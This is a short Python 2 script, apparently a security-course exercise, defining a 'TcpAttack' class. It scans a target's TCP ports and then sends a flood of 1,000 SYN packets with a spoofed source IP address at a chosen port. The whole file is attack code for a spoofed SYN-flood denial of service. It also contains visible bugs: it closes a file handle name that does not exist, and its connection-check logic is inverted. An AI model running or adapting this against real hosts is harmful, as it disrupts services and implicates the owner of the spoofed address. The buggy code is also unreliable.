from socket import *
from scapy.all import *

class TcpAttack:
	def __init__(self,spoofIP,targetIP):
		self.spoofIP = spoofIP
		self.targetIP = targetIP

	def scanTarget(self,rangeStart,rangeEnd):
		fo = open("openports.txt","w")
		output = ""
		targetIP = gethostbyname(self.targetIP)
		spoofIP = gethostbyname(self.spoofIP)
		for port in range(rangeStart,rangeEnd+1):
			tempsocket = socket(AF_INET,SOCK_STREAM)
			tempsocket.settimeout(1)
			try_connect = tempsocket.connect_ex((targetIP,port))
			if try_connect == 0:
				output = "Port " + str(port) + " is available.\n"
				fo.write(output)
				tempsocket.close()
			else:
				print "Port " + str(port) + " is closed."
		fout.close()

	def attackTarget(self,port):
		tempsocket = socket(AF_INET,SOCK_STREAM)
		tempsocket.settimeout(1)
		spoofIP = gethostbyname(self.spoofIP)
		targetIP = gethostbyname(self.targetIP)
		try_connect = tempsocket.connect_ex((targetIP,port))
		if try_connect == 1:
			temp = IP(src = spoofIP,dst = targetIP) / TCP(dport = port, flags = "S")
			for i in range(1000):
				send(temp)
			return 1
		else:
			return 0
